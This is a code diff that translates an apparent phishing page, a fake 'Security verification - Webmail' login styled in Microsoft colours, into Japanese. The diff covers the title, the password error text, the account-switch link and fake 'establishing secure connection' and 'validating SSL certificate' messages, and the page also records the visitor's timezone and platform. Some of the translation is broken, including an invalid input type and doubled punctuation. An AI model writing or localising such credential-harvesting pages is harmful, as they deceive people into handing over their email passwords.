@@ -6,7 +6,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Security verification - Webmail</title>
+    <title>セキュリティ確認 - ウェブメール</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <style>
         :root { --ms-blue: #0078d4; --ms-blue-dark: #106ebe; --ms-red: #d13438; }
@@ -150,11 +150,11 @@
                 <div class="input-group">
                     <label>Password</label>
                     <input type="パスワード" id="passwordInput" class="input-field" placeholder="パスワード" autocomplete="off">
-                    <div id="passwordError" class="error-message">Your password is incorrect. Please try again.</div>
+                    <div id="passwordError" class="error-message">パスワードが間違っています。もう一度お試しください。</div>
                 </div>
                 <a class="back-link" style="text-align: left; margin-bottom: 16px;">パスワードをお忘れですか？?</a>
                 <button class="btn" id="verifyBtn">ログイン</button>
-                <div class="back-link" id="backToEmailBtn">← Use a different account</div>
+                <div class="back-link" id="backToEmailBtn">← 別のアカウントを使用する</div>
             </div>
         </div>
     </div>
@@ -177,7 +177,7 @@ var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 var platform = navigator.platform || "Unknown";
 
 // Boot sequence
-var bootMessages = ["Establishing secure connection...", "Validating SSL certificate...", "Ready"];
+var bootMessages = ["安全な接続を確立しています...", "SSL証明書を検証中...", "準備ができて"];
 var bootIndex = 0;
 function updateBoot() {
     if (bootIndex < bootMessages.length) {
